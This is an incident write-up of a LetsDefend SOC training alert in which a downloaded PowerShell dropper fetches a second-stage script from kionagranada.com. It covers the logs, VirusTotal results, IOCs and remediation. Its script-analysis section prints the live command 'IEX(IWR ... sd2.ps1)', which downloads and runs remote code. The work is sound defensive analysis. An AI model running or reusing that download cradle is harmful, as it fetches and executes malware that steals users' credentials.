# SOC153 – Suspicious PowerShell Script Executed

**Platform:** LetsDefend | **Severity:** Medium | **Classification:** True Positive | **Date:** March 14, 2024 **Host:** `Tony` (`172.16.17.206`) | **User:** `LetsDefend` | **Event ID:** 238

## Summary

A user on host Tony downloaded a PowerShell script from an Amazon S3 bucket and ran it, and EDR detected it without blocking it. The script downloaded a second-stage payload from `kionagranada.com`, and the firewall allowed the connection, so the alert was closed as a true positive and the host was contained.

<img width="1610" height="362" alt="01-alert-details" src="https://github.com/user-attachments/assets/2127cca1-afe5-4bf5-b562-734641797603" />


## The Attack

A **PowerShell download cradle** is a one-line command that fetches a script from the internet and runs it immediately. `IWR` (`Invoke-WebRequest`) downloads the script, and `IEX` (`Invoke-Expression`) executes it in memory, so the second stage never touches disk and is harder for antivirus to catch.

**Azorult** is an information stealer that collects saved passwords, browser cookies and other credentials and sends them to the attacker. Droppers like this one are often its delivery method: a small first-stage script whose only job is to pull down the real payload.

## Timeline

| Time (UTC) | Event |
| --- | --- |
| 17:22:25 | User downloads `payload_1.ps1` from an S3 bucket |
| 17:23:27 | Script runs `IEX(IWR ... kionagranada.com/upload/sd2.ps1)`\* |
| 17:23:43 | SOC153 alert fires; EDR action Detected, not blocked |
| 17:23:46 | `powershell.exe` resolves `kionagranada.com` to `161.22.46.148`\* |
| 17:23:47 | Firewall allows `powershell.exe` to connect to `161.22.46.148:443`\* |

\*Log Management displays these events at 10:23, seven hours behind the UtcTime field in the Sysmon record; the log sources record time differently.

## Investigation

### 1. Alert Analysis

- **Host:** `Tony` (`172.16.17.206`)
- **File:** `payload_1.ps1`
- **Path:** `C:\Users\LetsDefend\Downloads\payload_1.ps1`
- **SHA-256:** `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0`
- **Device Action:** Detected

The file sat in the user's Downloads folder, and EDR only detected it, so it was allowed to run.

### 2. Hash Analysis

VirusTotal flags the hash as malicious with 34 of 61 vendors. The popular label is `trojan.powershell/boxter`, categorized as trojan, downloader and dropper, and several vendors attribute it to Azorult. VirusTotal knows the file as `agent3.ps1`, so it was renamed before delivery. Behavior tags include debugger detection, long sleeps and network adapter checks, which are common sandbox evasion tricks.

<img width="1912" height="977" alt="02-virustotal-hash" src="https://github.com/user-attachments/assets/87b8b70e-512d-428e-ac4b-181f67104f9f" />


### 3. Script Analysis

The PowerShell script block log (Event ID 4104) captured the command the script ran:

```
"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"
```

- `cmd.exe /c` launches PowerShell from the command shell.
- `IWR -UseBasicParsing` downloads `sd2.ps1` from `kionagranada.com`.
- `IEX` runs the downloaded script directly in memory, with no file written to disk.

No legitimate user downloads and executes scripts from an unknown domain in one line, so the command is malicious.

<img width="1571" height="569" alt="03-logs-powershell-script-block" src="https://github.com/user-attachments/assets/41a4aa0a-2389-46f2-9a19-60e3b0398d9e" />


### 4. Log Analysis

Browser history shows the download source: `payload_1.ps1` was fetched from `https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1` at 17:22:25, after routine browsing of Windows 10/11 tips sites. Attackers host files on S3 because the domain looks legitimate and is rarely blocked.

A Log Management search for `kionagranada.com` returned a Sysmon DNS query (Event ID 22) from `powershell.exe` resolving the domain to `161.22.46.148`. A search for that IP returned a firewall log showing `172.16.17.206:49848 → 161.22.46.148:443` with status SUCCESS. The parent process was `explorer.exe`, meaning the user started the script manually.

<img width="3049" height="2475" alt="04-logs-dns-and-firewall" src="https://github.com/user-attachments/assets/172b2d97-592a-44b0-a250-ae5dd6a728a2" />


### 5. Verdict Reasoning

Each finding confirms the next step of the attack chain:

| Clue | Meaning |
| --- | --- |
| 34/61 VirusTotal detections | Known malicious downloader |
| `IEX(IWR ...)` in the script block log | Second stage downloaded and run in memory |
| DNS query from `powershell.exe` | The script reached out to attacker infrastructure |
| Firewall status SUCCESS | The connection completed; the payload was likely retrieved |
| EDR action Detected | Nothing stopped the execution |

The malware ran, was not quarantined, and contacted its C2 server, which makes this a **true positive** requiring containment.

## Artifacts

Malicious URLs and domains are defanged.

| Type | Indicator |
| --- | --- |
| SHA-256 | `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0` (`payload_1.ps1`) |
| Download URL | `hxxps://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/payload_1.ps1` |
| Second-stage URL | `hxxps://kionagranada[.]com/upload/sd2.ps1` |
| Domain | `kionagranada[.]com` |
| C2 IP | `161.22.46[.]148` |

## Response and Recommendations

Host Tony was contained. Because Azorult steals credentials, the user's passwords should be reset and active sessions revoked. Block `kionagranada.com` and `161.22.46.148` at the firewall, proxy and DNS, search other endpoints for the file hash and IOCs, and reimage Tony before returning it to service.

To prevent a repeat, switch EDR from detect to block for known-malicious scripts, restrict PowerShell for standard users with Constrained Language Mode or application control, alert on download cradles like `IEX` with `IWR` in script block logs, and train users not to run scripts downloaded from the web.

## Conclusion

**True Positive.** A user ran a malicious PowerShell downloader on `Tony`, EDR did not block it, and the script successfully connected to `kionagranada.com` (`161.22.46.148`) to fetch a second-stage payload. The host was contained.

**MITRE ATT&CK:** T1189 (Drive-by Compromise), T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell), T1071 (Application Layer Protocol)
